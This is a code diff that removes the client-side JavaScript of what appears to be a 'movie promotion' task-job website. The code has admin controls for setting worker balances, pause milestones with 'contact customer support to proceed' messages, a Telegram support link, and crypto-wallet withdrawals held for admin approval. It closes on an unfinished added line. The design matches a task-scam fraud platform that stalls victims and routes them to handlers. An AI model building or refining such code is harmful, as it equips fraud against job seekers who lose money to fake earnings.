-      document.getElementById('admin-pause-message').value = user.pauseMessage || "You have reached a pause milestone. Kindly contact customer support to proceed to the next task.";
-      document.getElementById('admin-user-set-select').value = user.currentSet || 1;
-
-      const wReqText = document.getElementById('admin-withdraw-request-text');
-      const wApproveBtn = document.getElementById('approve-withdraw-btn');
-
-      if (user.withdrawalStatus === 'Pending') {
-        const wAmt = user.withdrawalAmount || user.balance || 0;
-        wReqText.innerHTML = `<strong>${selectedUser}</strong> requested <strong>$${wAmt.toFixed(2)}</strong><br><small>Wallet: ${user.walletAddress || 'N/A'}</small>`;
-        wApproveBtn.style.display = 'block';
-      } else {
-        wReqText.innerText = 'No pending withdrawal requests for this member.';
-        wApproveBtn.style.display = 'none';
-      }
-    }
-
-    async function saveAdminUserSettings() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      const newBal = parseFloat(document.getElementById('admin-user-balance').value) || 0;
-      const stopNum = parseInt(document.getElementById('admin-stop-work-num').value) || 16;
-      const setNum = parseInt(document.getElementById('admin-user-set-select').value) || 1;
-      const pauseMsg = document.getElementById('admin-pause-message').value.trim();
-
-      window.users[selectedUser].balance = newBal;
-      window.users[selectedUser].stopLimit = stopNum;
-      window.users[selectedUser].pauseMessage = pauseMsg;
-      
-      if (window.users[selectedUser].currentSet !== setNum) {
-        window.users[selectedUser].currentSet = setNum;
-        window.users[selectedUser].completedInSet = 0;
-      }
-
-      if (window.users[selectedUser].completedInSet < stopNum) {
-        window.users[selectedUser].isSetApproved = true;
-      }
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) {
-        await window.saveUserToFirebase(window.users[selectedUser]);
-      }
-      window.populateAdminUsers();
-      renderUI();
-      alert(`Updated settings for ${selectedUser}!`);
-    }
-
-    async function clearMemberPause() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      window.users[selectedUser].stopLimit = 16;
-      window.users[selectedUser].isSetApproved = true;
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) {
-        await window.saveUserToFirebase(window.users[selectedUser]);
-      }
-      window.populateAdminUsers();
-      renderUI();
-      alert(`Cleared pause for ${selectedUser}! Member can now continue tasks.`);
-    }
-
-    async function approveNextSet() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return alert('Please select a member first.');
-
-      const user = window.users[selectedUser];
-      if (user.currentSet < 3) {
-        user.currentSet += 1;
-        user.completedInSet = 0;
-        user.stopLimit = 16;
-        user.isSetApproved = true;
-        window.saveUsers();
-        if (window.saveUserToFirebase) await window.saveUserToFirebase(user);
-        window.populateAdminUsers();
-        renderUI();
-        alert(`Approved Set for ${selectedUser}! Moved to Set ${user.currentSet}.`);
-      } else {
-        alert(`${selectedUser} has already completed all 3 sets!`);
-      }
-    }
-
-    async function savePictureAndSettings() {
-      const setNum = document.getElementById('edit-set-num').value;
-      const imgIdx = document.getElementById('edit-img-index').value;
-      const reward = parseFloat(document.getElementById('edit-img-reward').value) || 0.50;
-      const comment = document.getElementById('edit-img-comment').value.trim();
-      const fileInput = document.getElementById('edit-img-file');
-
-      const key = `${setNum}-${imgIdx}`;
-
-      if (fileInput.files && fileInput.files[0]) {
-        const reader = new FileReader();
-        reader.onload = async function(e) {
-          const picData = {
-            imageData: e.target.result,
-            reward: reward,
-            comment: comment
-          };
-          window.globalPictureData[key] = picData;
-          window.savePictures();
-          if (window.savePicturesToFirebase) await window.savePicturesToFirebase(key, picData);
-          alert(`Saved picture & settings for Set ${setNum}, Image #${imgIdx}`);
-          renderUI();
-        };
-        reader.readAsDataURL(fileInput.files[0]);
-      } else {
-        const existingImg = window.globalPictureData[key]?.imageData || "https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=600";
-        const picData = {
-          imageData: existingImg,
-          reward: reward,
-          comment: comment
-        };
-        window.globalPictureData[key] = picData;
-        window.savePictures();
-        if (window.savePicturesToFirebase) await window.savePicturesToFirebase(key, picData);
-        alert(`Saved details for Set ${setNum}, Image #${imgIdx}`);
-        renderUI();
-      }
-    }
-
-    async function requestWithdrawal() {
-      if (!currentUser || !window.users[currentUser]) return;
-      const user = window.users[currentUser];
-      const wallet = document.getElementById('withdraw-wallet-address').value.trim();
-      const amount = parseFloat(document.getElementById('withdraw-amount-input').value) || 0;
-
-      if (!wallet || amount <= 0) return alert('Please enter a valid wallet address and amount.');
-      if (amount > user.balance) return alert('Insufficient balance!');
-
-      user.withdrawalStatus = 'Pending';
-      user.withdrawalAmount = amount;
-      user.walletAddress = wallet;
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) await window.saveUserToFirebase(user);
-      renderUI();
-      alert('Withdrawal request submitted! Pending admin approval.');
-    }
-
-    async function approveWithdrawal() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      const user = window.users[selectedUser];
-      const wAmt = user.withdrawalAmount || 0;
-
-      user.balance = Math.max(0, user.balance - wAmt);
-      user.withdrawalStatus = 'Approved';
-      user.withdrawalAmount = 0;
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) await window.saveUserToFirebase(user);
-      window.populateAdminUsers();
-      renderUI();
-      alert(`Approved withdrawal of $${wAmt.toFixed(2)} for ${selectedUser}!`);
-    }
-
-    async function promoteMovie() {
-      if (!currentUser || !window.users[currentUser]) return;
-      const user = window.users[currentUser];
-      const maxWork = user.stopLimit || 16;
-
-      if (user.completedInSet >= maxWork || user.isSetApproved === false) return;
-
-      const key = `${user.currentSet}-${user.completedInSet + 1}`;
-      const reward = parseFloat(window.globalPictureData[key]?.reward || 0.50);
-
-      user.completedInSet += 1;
-      user.balance = (user.balance || 0) + reward;
-
-      if (user.completedInSet >= maxWork) {
-        user.isSetApproved = false;
-      }
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) await window.saveUserToFirebase(user);
-
-      document.getElementById('modal-reward-text').innerText = `You earned $${reward.toFixed(2)} for promotion #${user.completedInSet}!`;
-      document.getElementById('promo-modal').classList.remove('hidden');
-    }
-
-    function closeModal() {
-      document.getElementById('promo-modal').classList.add('hidden');
-      renderUI();
-    }
-
-    function renderUI() {
-      const authView = document.getElementById('auth-view');
-      const workerView = document.getElementById('worker-view');
-
-      document.getElementById('telegram-support-btn').href = window.telegramLink;
-      document.getElementById('support-set-link').href = window.telegramLink;
-
-      if (currentUser && window.users[currentUser]) {
-        authView.classList.add('hidden');
-        workerView.classList.remove('hidden');
-
-        const user = window.users[currentUser];
-        document.getElementById('user-display-name').innerText = user.username;
-        document.getElementById('worker-balance').innerText = `$${(user.balance || 0).toFixed(2)}`;
-        document.getElementById('current-set-display').innerText = `Set ${user.currentSet} / 3`;
-        document.getElementById('set-num-text').innerText = user.currentSet || 1;
-        document.getElementById('progress-text').innerText = `${user.completedInSet || 0} / 16 Completed`;
-        document.getElementById('progress-fill').style.width = `${((user.completedInSet || 0) / 16) * 100}%`;
-
-        const maxWork = user.stopLimit || 16;
-        const isPaused = (user.completedInSet >= maxWork) || (user.isSetApproved === false);
-
-        if (isPaused) {
-          document.getElementById('completed-set-message').classList.remove('hidden');
-          document.getElementById('movie-container').classList.add('hidden');
-          if (user.pauseMessage) {
-            document.getElementById('pause-reason-text').innerText = user.pauseMessage;
-          } else {
-            document.getElementById('pause-reason-text').innerText = "You have successfully completed this set! Kindly contact customer support to proceed to the next set.";
-          }
-        } else {
-          document.getElementById('completed-set-message').classList.add('hidden');
-          document.getElementById('movie-container').classList.remove('hidden');
-
-          const key = `${user.currentSet}-${(user.completedInSet || 0) + 1}`;
-          const currentPic = window.globalPictureData[key];
-
-          if (currentPic && currentPic.imageData) {
-            document.getElementById('movie-img').src = currentPic.imageData;
-          } else {
-            document.getElementById('movie-img').src = "https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=600";
-          }
-
-          document.getElementById('movie-title').innerText = `Movie Promotion #${(user.completedInSet || 0) + 1}`;
-          document.getElementById('admin-comment').innerText = currentPic?.comment ? `Admin Note: ${currentPic.comment}` : "Admin Comment: Ready to promote!";
-          document.getElementById('movie-reward').innerText = `$${parseFloat(currentPic?.reward || 0.50).toFixed(2)}`;
-        }
-
-        const wStatus = document.getElementById('withdraw-status');
-        if (user.withdrawalStatus === 'Pending') {
-          wStatus.innerText = `Pending withdrawal request for $${(user.withdrawalAmount || 0).toFixed(2)}`;
-          wStatus.style.color = 'var(--warning)';
-        } else if (user.withdrawalStatus === 'Approved') {
-          wStatus.innerText = `Last withdrawal approved successfully!`;
-          wStatus.style.color = 'var(--primary)';
-        } else {
-          wStatus.innerText = '';
-        }
-
-      } else {
-        authView.classList.remove('hidden');
-        workerView.classList.add('hidden');
-      }
-    }
-
-    renderUI();
-  </script>
-</body>
-</html>
+      <p id="
